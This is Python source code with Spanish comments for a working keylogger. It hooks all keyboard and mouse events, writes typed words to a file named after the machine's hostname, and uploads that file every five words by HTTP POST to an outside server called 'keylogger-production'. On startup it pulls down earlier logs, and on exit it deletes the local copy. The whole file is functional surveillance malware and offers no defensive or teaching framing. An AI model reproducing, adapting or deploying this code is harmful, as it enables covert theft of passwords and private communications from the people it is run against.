import keyboard
import mouse
import requests
import os
import socket
import atexit

palabra = ""
line_count = 0

# Obtener el nombre del equipo
hostname = socket.gethostname()

# Nombre del archivo basado en el nombre del equipo
filename = f"{hostname}_block.txt"

# URL del servidor
server_url = "https://keylogger-production.up.railway.app"

# Función para eliminar el archivo local al cerrar el programa
def cleanup():
    if os.path.exists(filename):
        os.remove(filename)
        print(f"Archivo {filename} eliminado.")

# Registrar la función cleanup para que se ejecute al cerrar el programa
atexit.register(cleanup)

def key(pulso):  # Función callback para detectar cuando se presiona una tecla
    global palabra
    if pulso.event_type == keyboard.KEY_DOWN:
        if pulso.name == "space":
            save_word()
        elif len(pulso.name) == 1 and pulso.name.isprintable():
            palabra += pulso.name


def on_click(click):  # Función callback para detectar cuando se presiona el click
    if isinstance(click, mouse.ButtonEvent):
        if click.event_type == "down":
            save_word()


keyboard.hook(key)
mouse.hook(on_click)


def save_word():  # Añade palabras al archivo cada que se presione espacio
    global line_count

    # Abre el archivo en modo "append" (añadir) para agregar nuevas líneas
    with open(filename, "a") as file:
        file.write(palabra + "\n")

    line_count += 1

    if line_count >= 5:
        send_server(filename)
        line_count = 0
    reset()


def send_server(filename):  # Envía el txt al servidor con un POST
    url = f"{server_url}/upload"
    with open(filename, "rb") as file:
        try:
            response = requests.post(url, files={"file": file})
            print(f"Respuesta del servidor: {response.text}")
        except requests.exceptions.RequestException as e:
            print(f"Error al enviar el archivo: {e}")


def reset():  # Resetea la palabra
    global palabra
    palabra = ""


def check_existing_file():  # Verifica si el archivo ya existe en el servidor
    url = f"{server_url}/files/{hostname}/{filename}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            # Si el archivo existe, lo descargamos y lo usamos como base
            with open(filename, "wb") as file:
                file.write(response.content)
            print(f"Archivo {filename} descargado del servidor.")
        else:
            print(f"El archivo {filename} no existe en el servidor. Se creará uno nuevo.")
    except requests.exceptions.RequestException as e:
        print(f"Error al verificar el archivo en el servidor: {e}")


# Verificar si el archivo ya existe en el servidor al iniciar el programa
check_existing_file()

try:  # Detiene el script cuando se presiona Escape y llama a la función unhook_all()
    keyboard.wait()
except KeyboardInterrupt:
    pass
finally:
    keyboard.unhook_all()
    mouse.unhook_all()